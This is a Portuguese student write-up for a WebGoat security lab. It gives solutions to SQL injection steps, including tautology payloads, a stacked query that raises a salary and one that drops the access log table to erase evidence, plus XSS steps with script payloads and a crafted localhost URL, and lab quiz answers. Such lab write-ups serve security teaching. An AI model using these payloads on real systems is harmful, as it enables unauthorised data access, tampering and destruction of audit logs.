# Aula 11

## Exercício 1 - *Injection*

### Pergunta 1.1

Os primeiros 4 desafios (Nº 2, 3, 4, 5) são apenas *queries* básicas, em que já temos permissão para as executar, apenas temos de saber a sintaxe do comando SQL
#### Passo 2
```select department from employees where userid=96134```
#### Passo 3
```update employees set department='Sales' where first_name='Tobi'```
#### Passo 4
```alter table employees add phone varchar(20); ```
#### Passo 5
```GRANT ALTER TABLE TO 'UnauthorizedUser'```
#### Passo 9
```SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'```
Esta *SQL Injection* funciona porque '1' = '1' é sempre verdadeiro (*true*). Portanto, temos de selecionar ' na primeira opção para fechar a *string* do *lastname*. Optar pelo OR para a condição do *WHERE* ser verdadeiro para todos os registos, e por fim escolher '1' = '1 sem fechar a plica, pois a mesma já está na *string* da *query*.
#### Passo 10
``` SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1 ```
Login\_count não está susceptível a SQL Injection pois este input está parametrizado. Como o *userid* espera receber um número, não há plicas à volta deste *input*, pelo que, para completar este desafio basta por um qualquer valor inteiro no *logincount*, e introduzir ```1 or 1=1``` no *userid*. 
#### Passo 11
``` ' OR '1' = '1``` - > No campo *Authentication TAN* e como resultado obtém-se a tabela *employees* com todos os dados, incluíndo os salários.
#### Passo 12
``` '; update employees set salary = 120000 where auth_tan = '3SL99A ``` 
Com os primeiros caractéres terminamos a *query*, encadeando de seguida uma outra que altera o valor o salário. A plica final não é fechada pois já está presente na *string* da *query*.

#### Passo 13
``` ';drop table access_log; select * from access_log where action =' ``` 
Novamente, encadeamos uma *query* SQL que apaga a tabela com os *logs*. Depois, para não haver erros de sintaxe, junta-se uma outra *query*, que termina com a plica ('). Como resultado, a tabela de *logs* é apagada, eliminando assim as "provas" dos "ataques" anteriores.


## Exercício 2 - *XSS*

### Pergunta 2.1
#### Passo 2
Sim, as cookies são iguais.
#### Passo 7
``` <script>alert("Hello")</script>```
O campo vulnerável é o "Enter your credit card number"
#### Passo 10
```start.mvc#test```
#### Passo 11
```http://localhost:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E```

phone home said {"lessonCompleted":true,"feedback":"Congratulations. You have successfully completed the ass<ignment.","output":"phoneHome Response is 1177239543"}
#### Passo 12
1. Solução 4
2. Solução 3
3. Solução 1 
4. Solução 2
5. Solução 4


## Exercício 3 - Quebra na Autenticação

### Pergunta 3.1



## Exercício 4 - *Vulnerable components*

### Pergunta 4.1

